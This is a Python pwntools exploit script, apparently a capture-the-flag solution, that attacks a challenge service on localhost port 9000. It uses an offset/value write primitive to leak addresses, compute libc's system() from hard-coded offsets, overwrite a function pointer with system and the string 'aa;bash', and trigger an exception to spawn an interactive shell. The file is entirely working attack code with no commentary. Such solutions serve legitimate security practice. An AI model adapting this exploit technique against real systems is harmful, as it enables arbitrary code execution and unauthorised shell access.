from pwn import *

context.terminal = "tmux splitw -h".split()
libc = ELF('/bin/cat',0).libc

p = remote('localhost', 9000)
#p = process("./chall.py")
#gdb.attach(p.pid)

def write(off, val):
    p.sendlineafter(b"offset: ", str(off).encode())
    p.sendlineafter(b"value: ", str(val).encode())

def get(idx):
    p.recvuntil(b": ")
    data = eval(p.recvuntil(b"\n",drop=True))   
    x = [unpack(data[i:i+8],'all') for i in range(0, len(data), 8)]
    return x[idx]

def write8(off, val):
    for i in range(8):
        if val & 0xff:
            write(off + i, val & 0xff)
        val >>= 8
    
write(16, 120)
y = get(7)

data_addr = y - 0x80
loop_addr = data_addr - 0x24bd8

print('data_addr:', hex(data_addr))
print('loop_addr:', hex(loop_addr))

# change loop counter
write(loop_addr - data_addr, 0xf0)

write(40, (data_addr + 0x26d0) & 0xff)
write(41, ((data_addr + 0x26d0) >> 8) & 0xff)
write(42, ((data_addr + 0x26d0) >> 16) & 0xff)
rand_addr = get(0)
print('rand_addr:', hex(rand_addr))

write8(40, rand_addr + 0x50)
idk_addr = get(0) - 0x16671
print('idk:', hex(idk_addr))

system = idk_addr + 0x358d70
print('libc_system:', hex(system))

open_addr = data_addr + 0x1b30f0

print('open_addr:', hex(open_addr))
write8(open_addr - data_addr, unpack(b"aa;bash",'all'))
write8(open_addr - data_addr + 48, system)

# trigger exception so it will call open
p.sendlineafter(b"offset: ", b'\x00')

p.interactive()
